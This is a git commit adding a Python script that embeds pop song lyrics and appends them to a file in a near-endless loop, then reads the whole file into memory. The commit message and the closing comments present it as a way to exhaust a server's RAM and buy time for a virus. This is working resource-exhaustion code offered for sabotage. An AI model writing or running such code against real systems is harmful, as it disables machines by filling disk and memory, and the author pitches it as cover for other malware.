091043a7d57d5775c12cbbcd0c4b24c8d95292e5
MrInverse <106486750+MrInverse@users.noreply.github.com>
2022-05-29 10:32:42 -0700

    begin
    this program are a axiliary program , and goes to fuck servers RAM !
    waw !
    and you can BUYING the time for your virus or anything...
    bang !

---
+++ begin.py
@@ -0,0 +1,91 @@
+txt = '''
+Turn me from a cat into a dog
+Now I want you to take me on a walk
+Watch me be the loyalest of all
+Okay baby here's the leash, purr, purr, purr
+I don't wanna be just friends
+It's no coincidence, it's a kitty-incidence
+They be testing out your patience but I'm here for it
+Girl, I promise (girl, I promise)
+So get used to it, ain't no stopping
+Me when you walk in
+Got me acting up all crazy, lemme be your pet
+Baby make a lil' room, let me get next to ya
+I was messin' (I was messin')
+Now I'm thankin' ya
+I learned my lesson (purr, purr)
+Baby, baby, you give me a halo (yeah, yeah, yeah, yeah)
+I was far from cute before now I'm an angel (yeah, yeah, yeah, yeah)
+So make room for me, I hope you don't let go (yeah, yeah, yeah, yeah)
+'Cause I've been such a good boy, I hope you don't say no (meow)
+now int give a fuck (na na na nanaaaaa !) now int give a fuck (na , na na , na na , na , na , naaaaaa ! )
+(But) oh my God, what is this new emotion?
+Now I'm such a puppy when you hold me
+Feed me love, it's perfect and you know it
+Follow you in circles and know that it's not a joke, babe
+(Oh, oh, oh, oh)
+I'll walk over the obstacles and be there 'til the bitter end
+(Oh, oh, oh, oh)
+I just hope you understand (purr, purr, purr)
+I don't wanna be just friends
+(*&*$*()#()^@&$*@$@!14%^???|??||?#%$#@!#%^)
+It's no coincidence, it's a kitty-incidence
+They be testing out your patience but I'm here for it
+Girl, I promise (girl, I promise)
+So get used to it (used to it), ain't no stopping
+Me when you walk in
+Got me acting up all crazy, lemme be your pet
+Baby, make a lil' room, let me get next to ya
+I was messin' (I was messin')
+Now I'm thankin' ya
+I learned my lesson (purr, purr)
+I'm the one you can't keep your, keep your paws off (hey)
+Go fetch when you say that I'm a dog walk (hey)
+Fight for you in the biggest pack of wolves
+They be racing, but I'm comin' in first, Impala
+(Come to me) yeah, I like it when we cuddle
+(Come to me) yeah, when you get yourself in trouble
+I'm everything (shoo)
+From the soft side to the tough stuff
+'Til we cross the rainbow bridge, I'll be the one you always dream of
+(Oh-oh-oh-oh)
+Bet nobody else speaks the lil' language between you and me
+(Oh-oh-oh-oh)
+I just hope you understand (purr, purr, purr)
+I don't wanna be just friends
+It's no coincidence, it's a kitty-incidence
+They be testing out your patience but I'm here for it
+Girl, I promise (girl, I promise)
+So get used to it, ain't no stopping
+Me when you walk in
+Got me acting up all crazy, lemme be your pet
+Baby make a lil' room, let me get next to ya
+I was messin' (I was messin')
+Now I'm thankin' ya
+I learned my lesson (purr, purr)
+Let's play forever, I just wanna be your dog
+(Oh-oh-oh-oh)
+(Oh-oh-oh-oh)
+I just wanna be your dog
+(Oh-oh-oh-oh)
+Let's play forever, I just wanna be your dog
+(Oh-oh-oh-oh)
+(Oh-oh-oh-oh)
+I just wanna be your dog
+'''
+fux = ""
+
+with open('N.txt','w') as f :
+    pass
+
+with open('N.txt','a') as g :
+        for j in range(1,600000000000000000000000000000000000000000000):
+            for i in txt*9999:
+                g.write(i)
+
+t = open('N.txt','r')
+print(t.read())
+
+
+# just change 10 to 100000000000000000000 , and t=open('N.txt','r')
+# ta seen a big exploit at servers and << buying the TIME ! >>
